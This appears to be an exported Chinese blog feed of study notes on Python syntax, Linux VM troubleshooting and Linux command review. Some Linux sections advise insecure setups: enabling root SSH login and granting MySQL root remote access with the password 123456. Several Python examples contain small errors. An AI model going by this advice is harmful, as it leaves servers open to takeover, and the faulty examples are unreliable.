title="5、运算符"></a>5、运算符</h4><p>运算符包含：算术运算符、赋值运算符、比较(关系)运算符、逻辑运算符、位运算符<br><strong>1.算术运算符</strong><br><code>+</code>、<code>-</code>、<code>*</code>、<code>/</code><br>取整除：<code>//</code>(向下取整)<br>取余：<code>%</code><br>幂次：<code>**</code><br><strong>2.赋值运算符</strong><br>简单赋值 <code>=</code><br>加法赋值 <code>+=</code><br>减法赋值 <code>-=</code><br>乘法赋值 <code>*=</code><br>除法赋值 <code>/=</code><br>取整除赋值 <code>//=</code><br>取余赋值 <code>%=</code><br>幂赋值 <code>**=</code><br><strong>3.比较(关系)运算符</strong><br>等于 <code>==</code><br>不等于 <code>!=</code> 或 <code>&lt;&gt;</code>(a != b 或 a &lt;&gt; b)<br>大于 <code>&gt;</code><br>小于 <code>&lt;</code><br>大于等于 <code>&gt;=</code><br>小于等于 <code>&lt;=</code><br><strong>4.逻辑运算符</strong><br>逻辑运算符返回值为true 或 false。<br>布尔与 <code>and</code> ：如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。。<br>布尔或 <code>or</code> ：如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。<br>布尔非 <code>not</code> ： 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。<br><strong>5.位运算符</strong><br>位运算过程中，把数字转化成二进制计算，然后再转化成数字。<br>按位与 <code>&amp;</code> ：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0。<br>按位或 <code>|</code>：参与运算的两个值, 只要有一个位置为1，则该位的结果为1。<br>按位异或 <code>^</code> ：参与运算的两个值,如果两个相应位数值不同，则结果为1，若相同，则结果为0.<br>按位取反 <code>~</code> ：对数据的每个二进制位取反,即把1变为0,把0变为1 。<br>左移位 <code>&lt;&lt;</code> ：若 a &lt;&lt; 2 将数字a对应的二进制数集体向左移动2位，后面空余的2位补零。<br>(例：原a二进制：0011 1100, a &lt;&lt; 2 ,得 1111 0000，加黑为补零位。)<br>右移位 <code>&gt;&gt;</code> ：若 a &gt;&gt; 3 将数字a对应的二进制数集体向右移动2位，前面空余的2位补零。<br>(例：原a二进制：0011 1100, a &gt;&gt; 2 ,得 0000 1111，加黑为补零位。)<br><strong>6.成员运算符</strong><br>检测 x 是否在 y 的序列中。<br><code>in</code> ：若 x 在 y 的序列中，则返回True，否则返回False。<br><code>not in</code> ：若 x 不在 y 的序列中，则返回True，否则返回False。<br><strong>7.身份运算符</strong><br>用于比较两个对象 A 和 B 的存储单元是否一致，即判断两个标识符 A 和 B 是不是引用自一个对象。<br><code>is</code> ： <code>x is y</code>, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False。 # id() 函数用于获取对象内存地址。<br><code>is not</code> ： <code>x is not y</code> ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。 # id() 函数用于获取对象内存地址。<br><strong>8.运算符的优先级</strong><br><img src="http://img-blog.csdnimg.cn/20200115004042955.png" alt="在这里插入图片描述"></p><h4 id="6、基本输入和输出"><a href="#6、基本输入和输出" class="headerlink" title="6、基本输入和输出"></a>6、基本输入和输出</h4><p><strong>1.input()函数输入</strong><br>input()函数返回值是字符串类型</p><pre><code class="python">variable = input(&quot;提示文字&quot;)</code></pre><p>返回值类型转换</p><pre><code class="python">&gt;&gt;&gt; tips = input(&quot;请输入内容：&quot;)请输入内容：123&gt;&gt;&gt; print(tips,type(tips))123 &lt;class &#39;str&#39;&gt;&gt;&gt;&gt; hints = int(input(&quot;请输入内容：&quot;))请输入内容：456&gt;&gt;&gt; print(hints,type(hints))456 &lt;class &#39;int&#39;&gt;</code></pre><p><strong>2.print()函数输出</strong></p><pre><code class="python">print(输出内容)</code></pre><pre><code class="python">a = 6b = 111print(&quot;数字：&quot;,666)print(&quot;表达式：&quot;,a*b)print(&quot;字符串：&quot;,&quot;努力吧！！&quot;)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200115010639233.jpg" alt="在这里插入图片描述"><br>输出到文件</p><pre><code class="python">fp = open(r&#39;D:\demo.txt&#39;,&#39;a+&#39;)print(&quot;加油！奥利给！！&quot;,file = fp)fp.close()</code></pre><p><img src="http://img-blog.csdnimg.cn/20200115011049666.jpg" alt="在这里插入图片描述"><br>在一行输出</p><pre><code class="python">for i in range(1,10):    print(i,end=&#39; &#39;)</code></pre><p><img src="http://img-blog.csdnimg.cn/2020011600081790.jpg" alt="在这里插入图片描述"></p><h3 id="三、流程控制"><a href="#三、流程控制" class="headerlink" title="三、流程控制"></a>三、流程控制</h3><h4 id="1、选择语句"><a href="#1、选择语句" class="headerlink" title="1、选择语句"></a>1、选择语句</h4><p><strong>1.简单的if语句</strong></p><pre><code class="python">if 表达式:    语句块</code></pre><p><strong>2.if…else语句</strong></p><pre><code class="python">if 表达式:    语句块1else:    语句块2</code></pre><p><strong>3.if…elif…else语句</strong></p><pre><code class="python">if 表达式1:    语句块1elif 表达式2:    语句块2......else:    语句块n</code></pre><p>如果已经定义一个布尔变量flag，if语句应写成以下形式：</p><pre><code class="python">if flag:if not flag:下面这种形式是不规范的：if flag == True:(X)</code></pre><p><strong>4.if语句的嵌套</strong></p><pre><code class="python">if 表达式1:    if 表达式2:        语句块2    else:        语句块3else:    语句块1</code></pre><h4 id="2、条件表达式"><a href="#2、条件表达式" class="headerlink" title="2、条件表达式"></a>2、条件表达式</h4><p>好处：使代码简洁；可以有一个返回值</p><pre><code class="python">结果1 if 表达式 else 结果2</code></pre><p>表达式为真，返回结果1；表达式为假，返回结果2<br>通常把结果赋值给一个变量</p><pre><code class="python">#求两个数的最大值a = 10b = 20r = a if a&gt;b else bprint(r)#求一个数的绝对值x = -10y = x if a&gt;0 else -x</code></pre><h4 id="3、循环语句"><a href="#3、循环语句" class="headerlink" title="3、循环语句"></a>3、循环语句</h4><p><strong>1.while循环</strong><br>一直重复，直到条件不满足时，才停止</p><pre><code class="python">while 条件表达式:    循环体</code></pre><p><strong>2.for循环</strong><br>重复一定次数，通常用于迭代、枚举或遍历</p><pre><code class="python">for 迭代变量 in 对象:    循环体</code></pre><p><img src="http://img-blog.csdnimg.cn/20200115231958341.png" alt="在这里插入图片描述"><br><em>循环数值</em></p><pre><code class="python">#计算1+2+...+100的和result = 0 #保存累加结果的变量for i in range(101):    result += i #实现累加print(result)</code></pre><p><em>遍历字符串</em></p><pre><code class="python">string = &#39;努力不一定成功&#39;for ch in string:    print(ch)</code></pre><p><img src="http://img-blog.csdnimg.cn/20200115234446685.jpg" alt="在这里插入图片描述"><br><a href="http://www.runoob.com/python/python-func-range.html" target="_blank" rel="noopener">range()函数</a>：生成一系列连续的整数<br><code>range(start,end,step)</code><br><code>start</code>: 计数从start开始。默认是从 0 开始。例如：range(5)等价于range(0,5)<br><code>end</code>: 计数到end结束，但不包括 stop。例如：range(0,5)是[0, 1, 2, 3, 4]没有5<br><code>step</code>：步长，默认为1。例如：range(0,5)等价于range(0,5,1)</p><p>range()函数替换Python2中的xrange()函数<br><strong>3.循环嵌套</strong></p><pre><code class="python">while 条件表达式1:    while 条件表达式2:        循环体2    循环体1</code></pre><pre><code class="py">while 条件表达式:    for 迭代变量 in 对象:        循环体2    循环体1</code></pre><pre><code class="py">for 迭代变量 in 对象:    while 条件表达式:        循环体2    循环体1</code></pre><p>等等</p><h4 id="4、跳转语句"><a href="#4、跳转语句" class="headerlink" title="4、跳转语句"></a>4、跳转语句</h4><p><strong>1.break语句</strong><br>完全跳出循环<br><strong>2.continue语句</strong><br>只跳出一次循环，然后继续下一次循环</p><h4 id="5、pass空语句"><a href="#5、pass空语句" class="headerlink" title="5、pass空语句"></a>5、pass空语句</h4><p>pass语句，表示空语句。它不做任何事情，一般起到占位作用。<br>通常用于流程控制语句、函数、类中。</p><pre><code class="py">for i in range(1,10):    if i%2 == 0:        print(i,end=&#39;,&#39;) #输出偶数    else:        pass #占位，不做任何事</code></pre><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>学习完Python的<strong>开发工具、基本语法、流程控制</strong>，对Python的一些语法有了一些认识。<br>收获之处：学习了流程控制中条件表达式和for循环的使用。同时注意到Python中没有do…while循环。<br>继续学习@_@</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
            <tag> 基本语法 </tag>
            
            <tag> 流程控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux虚拟机常见使用及常见问题</title>
      <link href="/2020/01/07/Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/2020/01/07/Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B8%B8%E8%A7%81%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Linux使用过程中经常遇到一些问题，于是总结一下。</p><h3 id="一、ubantu不显示和不能用本地ip"><a href="#一、ubantu不显示和不能用本地ip" class="headerlink" title="一、ubantu不显示和不能用本地ip"></a>一、ubantu不显示和不能用本地ip</h3><p><img src="http://img-blog.csdnimg.cn/20191208201643143.jpg" alt="在这里插入图片描述"><br>解决方法：</p><pre><code class="shell">sudo dhclient ens33sudo ifconfig ens33</code></pre><p><img src="http://img-blog.csdnimg.cn/20191208202137639.jpg" alt="在这里插入图片描述"></p><h3 id="二、ubantu解决“无法获得锁”"><a href="#二、ubantu解决“无法获得锁”" class="headerlink" title="二、ubantu解决“无法获得锁”"></a>二、ubantu解决“无法获得锁”</h3><h4 id="现象一：E-无法获得锁-var-lib-dpkg-lock-open-11-资源暂时不可用"><a href="#现象一：E-无法获得锁-var-lib-dpkg-lock-open-11-资源暂时不可用" class="headerlink" title="现象一：E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)"></a>现象一：E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)</h4><p>在ubuntu系统的termial下，用apt-get install 安装软件的时候，如果在未完成下载的情况下将terminal close。此时 apt-get进程可能没有结束，而Linux只允许开一个apt-get。结果，如果再次运行apt-get install 命令安装如今，可能会发生下面的提示：</p><blockquote><p>无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)<br>无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？</p></blockquote><p><strong>解决方法一</strong>：<br>终端输入 <code>ps  aux|grep apt</code> ，列出进程。找到含有apt-get的，直接<code>sudo kill PID</code>。如：<code>sudo kill -9 PID</code></p><p><strong>解决方法二</strong>：<br>强制解锁,命令</p><pre><code class="shell">sudo rm /var/lib/dpkg/lock或sudo rm /var/lib/apt/lists/lock</code></pre><h4 id="现象二：E-无法获得锁-var-cache-apt-archives-lock-open-11-资源临时不可用"><a href="#现象二：E-无法获得锁-var-cache-apt-archives-lock-open-11-资源临时不可用" class="headerlink" title="现象二：E: 无法获得锁 /var/cache/apt/archives/lock - open (11 资源临时不可用)"></a>现象二：E: 无法获得锁 /var/cache/apt/archives/lock - open (11 资源临时不可用)</h4><blockquote><p>E: 无法获得锁 /var/cache/apt/archives/lock - open (11 资源临时不可用)<br>E: 无法锁定下载目录</p></blockquote><p><strong>解决方法一</strong>：<br>1、命令：<code>ps -aux | grep apt-get</code> 列出进程<br>2、找到最后一列以apt-get 开头的进程<br>命令：<code>sudo kill 该进程的PID</code><br><strong>解决方法二</strong>：</p><pre><code class="shell">sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock</code></pre><h3 id="三、配置桥接网络，静态ip"><a href="#三、配置桥接网络，静态ip" class="headerlink" title="三、配置桥接网络，静态ip"></a>三、配置桥接网络，静态ip</h3><p>1、配置VMware虚拟机的网络适配器为桥接模式<br><img src="http://img-blog.csdnimg.cn/20200107150825555.jpg" alt="在这里插入图片描述"><br>2、首先输入命令：<code>vi /etc/network/interfaces</code>，配置ip信息<br><img src="http://img-blog.csdnimg.cn/20200107150309824.jpg" alt="在这里插入图片描述"><br>3、重启网卡：<code>service networking restart</code><br>输入<code>ifconfig</code>发现配置成功<br><img src="http://img-blog.csdnimg.cn/20200107151024573.jpg" alt="在这里插入图片描述"><br>4、DNS域名解析服务器配置：<code>vi /etc/resolv.conf</code></p><p><code>/etc/resolv.conf</code>它是DNS客户机配置文件，用于设置DNS服务器的IP地址及DNS域名，还包含了主机的域名搜索顺序。该文件是由域名解析器（resolver，一个根据主机名解析IP地址的库）使用的配置文件。它的格式很简单，每行以一个关键字开头，后接一个或多个由空格隔开的参数。<br>resolv.conf的关键字主要有四个，分别是：</p><blockquote><p>nameserver       #定义DNS服务器的IP地址<br>domain              #定义本地域名<br>search               #定义域名的搜索列表<br>sortlist               #对返回的域名进行排序</p></blockquote><p>下面我们给出一个/etc/resolv.conf的示例：</p><blockquote><p>domain  51osos.com<br>search  51osos.com<br>nameserver 202.102.192.68<br>nameserver 202.102.192.69</p></blockquote><p>最主要是nameserver关键字，如果没指定nameserver就找不到DNS服务器，其它关键字是可选的。<br>这里写<code>nameserver</code>关键字即可<br><img src="http://img-blog.csdnimg.cn/20200107152613574.jpg" alt="在这里插入图片描述"><br>5、重启网卡：<code>service networking restart</code><br>测试：<code>ping www.baidu.com</code><br><img src="http://img-blog.csdnimg.cn/2020010715291614.jpg" alt="在这里插入图片描述"><br>6、查看内网存活主机：<code>nmap -sn 192.168.1.1-255</code><br><img src="http://img-blog.csdnimg.cn/20200107153300893.jpg" alt="在这里插入图片描述"></p><h3 id="四、使用ssh以root用户直接登录"><a href="#四、使用ssh以root用户直接登录" class="headerlink" title="四、使用ssh以root用户直接登录"></a>四、使用ssh以root用户直接登录</h3><p>出于安全考虑，ubuntu默认不允许root远程登录<br><strong>解决方案</strong>：<br>1、安装openssh软件</p><pre><code class="shell">sudo apt install -y openssh-server</code></pre><p>2、编辑SSH文件</p><pre><code class="shell">sudo nano /etc/ssh/sshd_config将PermitRootLogin 的值改为yes将PermitEmptyPasswords 的值改为no</code></pre><p>3、重启ssh服务</p><pre><code class="shell">service ssh restart</code></pre><p>4、重新登录，就可以以root用户直接登录ssh。</p><h3 id="五、Ubuntu下搭建LAMP环境以及安装nginx服务器"><a href="#五、Ubuntu下搭建LAMP环境以及安装nginx服务器" class="headerlink" title="五、Ubuntu下搭建LAMP环境以及安装nginx服务器"></a>五、Ubuntu下搭建LAMP环境以及安装nginx服务器</h3><p>参考：<br><a href="https://www.cnblogs.com/opsprobe/p/9126411.html" target="_blank" rel="noopener">Ubuntu18.04下搭建LAMP环境</a><br><a href="https://www.cnblogs.com/zydtm/articles/8320083.html" target="_blank" rel="noopener">ubantu lamp环境安装</a><br><a href="https://www.linuxidc.com/Linux/2016-10/136327.htm" target="_blank" rel="noopener">Ubuntu 16.04搭建LAMP开发环境</a></p><p><a href="https://www.jianshu.com/p/ee18330f6e25" target="_blank" rel="noopener">ubantu下搭建php5.6+nginx+mysql开发环境</a><br><a href="https://www.cnblogs.com/duanlinxiao/p/10365683.html" target="_blank" rel="noopener">ubantu-nginx部署</a><br><a href="https://blog.csdn.net/u014374031/article/details/73441577" target="_blank" rel="noopener">ubuntu16.04安装nginx教程</a><br><a href="https://blog.csdn.net/fengfeng0328/article/details/82828224" target="_blank" rel="noopener">Ubuntu18.04搭建nginx服务器</a></p><h3 id="六、MySQL设置密码并允许远程登录"><a href="#六、MySQL设置密码并允许远程登录" class="headerlink" title="六、MySQL设置密码并允许远程登录"></a>六、MySQL设置密码并允许远程登录</h3><p>进入MySQL命令行并定位到mysql</p><pre><code class="sql">mysql -u root -p#没有密码的话直接回车use mysql</code></pre><p>输入修改语句</p><pre><code class="sql">update user set password=password(&quot;123456&quot;) where user=&quot;root&quot;;</code></pre><p>上述语句修改密码为123456 ;然后会显示Query OK;证明改密成功。<br>刷新MySQL的系统权限相关表</p><pre><code class="sql">flush privileges;­</code></pre><h4 id="问题1：在docker容器内访问宿主机mysql报：Error-1045-Access-denied-for-user-‘root’-’x-x-x-x’-using-password-YES"><a href="#问题1：在docker容器内访问宿主机mysql报：Error-1045-Access-denied-for-user-‘root’-’x-x-x-x’-using-password-YES" class="headerlink" title="问题1：在docker容器内访问宿主机mysql报：Error 1045: Access denied for user ‘root’@’x.x.x.x’ (using password: YES)"></a>问题1：在docker容器内访问宿主机mysql报：Error 1045: Access denied for user ‘root’@’x.x.x.x’ (using password: YES)</h4><p><strong>出错原因：</strong><br>1、密码输入错误;<br>2、-u后边跟的用户不存在；<br>3、权限原因导致（我的就是这个原因）针对这种原因的解决方法如下：</p><pre><code class="sql">grant all privileges on *.* to root@&#39;%&#39; identified by &#39;123456&#39; with grant option;flush privileges;exit</code></pre><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>大致就先总结那么多，持续更新中。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
          <category> Linux基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 问题整理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础期末整理复习</title>
      <link href="/2019/12/26/Linux%E5%9F%BA%E7%A1%80%E6%9C%9F%E6%9C%AB%E6%95%B4%E7%90%86%E5%A4%8D%E4%B9%A0/"/>
      <url>/2019/12/26/Linux%E5%9F%BA%E7%A1%80%E6%9C%9F%E6%9C%AB%E6%95%B4%E7%90%86%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="一、常用命令"><a href="#一、常用命令" class="headerlink" title="一、常用命令"></a>一、常用命令</h3><h5 id="1、目录操作命令"><a href="#1、目录操作命令" class="headerlink" title="1、目录操作命令"></a>1、目录操作命令</h5><p><strong>1.查看当前目录：pwd</strong><br>命令提示符由哪几部分组成：<code>命令名 [选项][参数]</code><br><strong>2.查看目录：ls  -al</strong><br><code>ls -l</code> 长格式显示<br><code>ls -a</code> 显示所有文件（包含隐藏文件）<br><code>ls -al</code><br><code>ls -h</code> 以常用单位显示文件大小<br><code>ls -d</code> 只显示目录，不显示目录下子文件<br><code>ls -i</code> 显示文件 inode 号<br><code>ls -l</code> 文件名<br>隐藏文件名特点：文件名前面都有个带点的符号;<br>显示的每一条信息各部分的含义：<br>权限位 引用计数 属主 属组 大小 最后一次修改时间 文件名</p><p><strong>3.切换目录：cd 目录名</strong><br>使用cd命令切换到上一层目录</p><p>使用绝对路径的方式切换到上层目录：cd 具体路径<br>使用相对路径的方式切换到上层目录：cd ..<br>“ .. ”表示上一级目录；“ .”表示当前目录。</p><p><strong>4.创建目录：mkdir 目录名</strong><br>使用mkdir命令在用户主目录下分别使用绝对路径和相对路径的方式创建一个newdir目录<br>在root目录下进行操作命令分别为：<br><code>mkdir /root/newdir</code><br><code>mkdir ./newdir</code><br><strong>5.删除目录：rmdir 目录名||rm 目录名||rm -rf 目录名</strong><br>使用rmdir命令删除刚才创建的newdir目录<br><code>rm newdir</code>（只能删空目录）；<code>rm –rf newdir</code></p><h5 id="2、文件操作命令"><a href="#2、文件操作命令" class="headerlink" title="2、文件操作命令"></a>2、文件操作命令</h5><p><strong>1.创建空文件：touch 文件名</strong><br><strong>2.删除文件：rm -rf 文件名</strong><br><strong>3.查看文件内容：cat 文件名</strong><br><strong>4.分屏显示文件内容：more 文件名</strong><br><strong>5.分行显示文件内容：less 文件名</strong><br><strong>6.显示文件头：head 文件名</strong><br><code>head -n 行数 文件名</code>    指定显示文件头几行<br><strong>7.显示文件尾：tail -n 行数 文件名</strong></p><h5 id="3、目录和文件操作命令"><a href="#3、目录和文件操作命令" class="headerlink" title="3、目录和文件操作命令"></a>3、目录和文件操作命令</h5><p><strong>1.删除文件或目录：rm ||rm -rf</strong><br><strong>2.复制文件或目录：cp 源文件 目标位置</strong><br>-r 复制目录<br>-p 连带文件属性复制<br>-d 若源文件是链接文件，则复制链接属性<br>-a 相当于 -pdr</p><p>可进行<strong>原名复制</strong>和<strong>改名复制</strong><br><strong>3.移动或重命名文件或目录：mv 源文件 目标位置</strong><br><strong>4.链接文件</strong><br><strong>硬链接：ln 源文件 目标文件</strong><br>可以看作是同一个文件进行复制</p><blockquote><p>不能跨分区<br>不能针对目录使用</p></blockquote><p><strong>软链接：ln -s 源文件 目标文件</strong><br>文件名都必须写绝对路径<br>类似 于Windows 快捷方式</p><blockquote><p>软链接文件权限都为 rwxrwxrwx<br>修改任意文件，另一个都改变<br>删除原文件，软链接不能使用</p></blockquote><h5 id="4、权限管理"><a href="#4、权限管理" class="headerlink" title="4、权限管理"></a>4、权限管理</h5><p><strong>1.权限位</strong><br>-rw-r–r–    1    root root    0 08-11 01:45 aa<br><code>属主权限 u</code>    <code>属组权限 g</code>    <code>其他人权限 o</code><br><em>权限对文件的含义</em><br><code>r    读：读取文件内容 cat more head tail     4</code><br><code>w    写：编辑、新增、修改文件内容(但是不包含删除文件) vi echo 2</code><br><code>x    执行：可执行    1</code><br><em>权限对目录的含义</em><br><code>r：可以查询目录下文件名 ls</code><br><code>w：具有修改目录结构的权限  touch rm mv cp</code><br><code>x：可以进入目录 cd</code></p><p><strong>2.修改权限</strong><br><code>chmod u+x aa</code> aa文件的属主加上执行权限<br><code>chmod u-x aa</code> aa文件的属主减去执行权限<br><code>chmod g+w,o+w aa</code> aa文件的属组和其他人加上写权限<br><code>chmod u=rwx aa</code> aa文件的属主赋读写和执行权限<br><code>chmod 755 aa</code><br><code>chmod 644 aa</code><br>文件和目录默认权限：umask<br>0022<br>文件： 666 022  644<br>目录： 777 022  755<br><strong>3.属主和属组命令</strong><br><code>chown 用户名 文件名</code> 改变文件属主<br><code>chown 用户名:属组名 文件名</code> 改变属主同时改变属组</p><p><code>useradd 用户名</code> 添加用户<br><code>passwd 用户名</code> 设定用户密码</p><p><code>chgrp 属组名 文件名</code> 改变属组</p><h5 id="5、帮助命令"><a href="#5、帮助命令" class="headerlink" title="5、帮助命令"></a>5、帮助命令</h5><p><code>man 命令名</code> 查看命令的帮助<br><code>help 内部命令</code> 查看内部命令帮助<br><code>命令 --help</code> 查看命令的常见选项<br><code>info 命令</code> 进入子帮助页面(带有<code>*</code>号标记)</p><h5 id="6、查找命令"><a href="#6、查找命令" class="headerlink" title="6、查找命令"></a>6、查找命令</h5><p><code>which 命令名</code> 查找命令的命令，能看到相关别名<br><code>whereis 命令名</code> 查找命令的命令，同时看到帮助文档位置<br><code>locate 文件名</code> 按照文件名查找 按照数据库查找  <code>updatedb</code>强制更新数据库</p><p><strong>1.<code>find 查找位置 -name 文件名</code> 按照文件名查找</strong><br><em>按照时间查找</em><br><code>-ctime</code> 按照文件状态修改时间（天） change<br><code>-mtime</code> 按照文件数据修改时间  modify<br><code>-atime</code> 按照访问时间 access<br>如：<code>find / -ctime +4</code></p><p><em>按照用户</em><br><code>-uid 数字</code> 按照用户属主 ID 查找文件<br><code>-gid 数字</code> 按照属组组 ID 查找文件<br><code>-user 用户名</code> 按照属主用户名查找文件<br><code>-group 组名</code> 按照属组组名查找文件<br><code>-nouser</code> 找没有属主的文件 <code>find / -nouser</code></p><p><em>按照文件权限</em><br><code>-name</code> 按照文件名<br><code>-size</code> 按照文件大小。+50k:大于 50k，-50k:小于 50k，50k:等于50k<br>如：<code>find / -size +50k</code><br><code>-type 类型</code> 按照文件类型 。f：普通  d：目录 l：链接<br><code>-perm 755</code> 按照权限查找<br>如：<code>find . -perm 644</code><br><code>-inum</code> 按照 i 节点  <code>ls -i</code><br>如：<code>find . -inum 节点数</code><br><code>-iname</code> 按照文件名查找，不区分大小写</p><p><strong>2.<code>grep &quot;字符串&quot; 文件名</code> 查找符合条件的字串行</strong><br><code>grep -i &quot;root&quot; /etc/passwd</code><br><code>-v</code> 反向选择<br><code>-i</code> 忽略大小写</p><p><code>|</code> 管道符<br><code>命令 1 | 命令 2</code> 命令 1 的结果，作为命令 2 的执行条件</p><h5 id="7、压缩和解压缩"><a href="#7、压缩和解压缩" class="headerlink" title="7、压缩和解压缩"></a>7、压缩和解压缩</h5><p><strong>（1）.zip格式</strong><br><em>压缩：</em><br><code>zip 压缩之后产生的包名 源文件</code><br>如：<code>zip -r test.zip /test</code>  -r 压缩目录<br><em>解压缩：</em><br><code>unzip 压缩包</code><br><strong>（2）.gz格式</strong><br>不会打包<br><em>压缩：</em><br><code>gzip -c 源文件 &gt; 压缩文件</code><br>如：<code>gzip -c cangls &gt; cangls.gz</code><br><code>gzip -r 源目录</code> 不能压缩目录，压缩目录下所有内容<br><em>解压缩：</em><br><code>gzip -d 压缩包</code><br><strong>（3）.bz2格式</strong><br>不能压缩目录<br><em>压缩：</em><br><code>bzip2 源文件</code> 如：<code>bzip2 aa</code><br><code>bzip2 -k 源文件</code>  压缩之后保留源文件<br><em>解压缩：</em><br><code>bzip2 -d 压缩文件</code> 如：<code>bzip2 -d aa.bz2</code></p><p>另一种：<code>bunzip2 压缩文件</code> 解压缩：-k 保留压缩文件<br><strong>（4）.tar格式</strong><br>打包命令，不压缩<br><em>打包：</em><br><code>tar -cvf 打包文件名 源文件</code> 如：<code>tar -cvf aa.tar aa</code><br>-c 打包  -v 显示打包过程 -f 指定生产后的文件名<br><em>解打包：</em><br><code>tar -xvf 打包文件名</code> 如：<code>tar -xvf aa.tar</code></p><p>.gz 格式<br><em>压缩同时打包：</em><br><code>tar -zcvf 压缩文件名 源文件</code><br>如：<code>tar -zcvf aa.tar.gz aa</code>  -z 识别.gz 格式<br><em>解压缩同时解打包：</em><br><code>tar -zxvf 压缩文件名</code></p><p>.bz2格式<br><em>压缩同时打包：</em><br><code>tar -jcvf 压缩文件名</code> 源文件压缩同时打包<br>如：<code>tar -jcvf aa.tar.bz2 aa</code><br><em>解打包同时解压缩：</em><br><code>tar -jxvf aa.tar.bz2</code></p><p><em>查看不解包</em><br><code>tar -ztvf aa.tar.gz</code> 查看不解包<br><code>tar -jtvf aa.tar.bz2</code> -t 只查看，不解压</p><p><strong>指定解压缩文件位置：</strong><br><code>tar -jxvf root.tar.bz2 -C /tmp/</code> 指定解压缩位置</p><h5 id="8、常用网络命令"><a href="#8、常用网络命令" class="headerlink" title="8、常用网络命令"></a>8、常用网络命令</h5><p><code>w</code>  查询当前登录服务器的所有用户<br><code>who</code> 查询登录用户<br><code>last</code> 列出登录系统的相关信息<br><code>lastlog</code> 显示所有账户最后一次的登录时间<br><code>write 用户名</code> 给在线用户写信息<br>如：<code>write root tty1</code> 写内容给 tty1 登录的 root，<code>ctrl+d</code> 保存，发送<br><code>wall</code> 对所有在线用户说话<br><code>mail</code> 邮件命令</p><p><code>ping -c 次数 ip</code> 探测网络通畅<br><code>ping -s 65536 ip</code>  指定探测数据包的大小</p><p><code>ifconfig</code>  查询本机网络信息<br><code>ifconfig eth0 192.168.140.252 netmask 255.255.255.0</code> 临时生效<br><code>eth0:0</code> 第一块网卡的第一模拟网卡</p><p><code>netstat</code> 查看网络状态<br><code>telnet ip 端口</code> 测试端口是否可以正常连接<br><code>netstat -tlun</code> 查看本机所有监听端口<br>-t tcp -u udp -l 监听 -n 以 IP 和端口号显示</p><h5 id="9、关机、重启命令"><a href="#9、关机、重启命令" class="headerlink" title="9、关机、重启命令"></a>9、关机、重启命令</h5><p>关机命令：<br><code>shutdown -h now</code><br><code>init 0</code><br><code>halt</code><br><code>poweroff</code></p><p>重启命令：<br><code>shutdown -r now</code><br><code>reboot</code><br><code>init 6</code></p><h5 id="10、挂载命令"><a href="#10、挂载命令" class="headerlink" title="10、挂载命令"></a>10、挂载命令</h5><p>首先选择光盘镜像，然后连接光盘镜像，最后挂载<br>挂载光盘</p><blockquote><p>mkdir /mnt/cdrom<br>mount /dev/cdrom /mnt/cdrom</p></blockquote><p>卸载光盘</p><blockquote><p>umount /dev/cdrom<br>umount /mnt/cdrom</p></blockquote><h3 id="二、软件安装"><a href="#二、软件安装" class="headerlink" title="二、软件安装"></a>二、软件安装</h3><p><strong>rpm包安装</strong><br>1、挂载光盘<br>2、进入/mnt/cdrom/Server/<br>3、执行命令<code>rpm -ivh 包全名</code><br><code>-i</code> install安装<br><code>-v</code> 显示更详细信息<br><code>-h</code> 打印#显示安装进度<br>4、服务启动</p><pre><code class="shell">service 服务名 start|stop|restart|status</code></pre><h3 id="三、用户管理"><a href="#三、用户管理" class="headerlink" title="三、用户管理"></a>三、用户管理</h3><p><strong>1、用户相关文件</strong><br><code>/etc/passwd</code> 用户信息文件<br><code>root:x:0:0:root:/root:/bin/bash</code><br>第一列：用户名<br>第二列：密码位<br>第三列：用户 ID</p><p><code>/etc/shadow</code> 影子文件<br><code>root:$6$9w5Td6lg$bgpsy3olsq9WwWvS5Sst2W3ZiJpuCGDY.4w4MRk3ob/i85fI38RH15wzVoomff9isV1PzdcXmixzhnMVhMxbv0:15775:0:99999:7:::</code><br>第一列：用户名<br>第二列：加密密码</p><p><code>/etc/group</code> 组信息文件<br><code>root:x:0:root</code><br>第一列：组名<br>第二列：组密码位<br>第三列：GID<br>第四列：此组中支持的其他用户.附加组是此组的用户</p><p><code>/etc/gshadow</code> 组密码文件</p><p><strong>2、用户管理命令</strong><br><em>1.添加用户</em><br>添加用户：<code>useradd 用户名</code><br>手工指定选项添加用户：<br>创建用户组lamp1：<code>groupadd 组名</code><br>建立用户qwzf：</p><pre><code class="shell">useradd -u 550 -g lamp1 -G root -d /home/lamp1 -c &quot;test user&quot; -s /bin/bash qwzf</code></pre><p>同时查看三个文件：</p><pre><code class="shell">grep &quot;qwzf&quot; /etc/passwd /etc/shadow /etc/group</code></pre><p>查看用户家目录：<code>ll -d 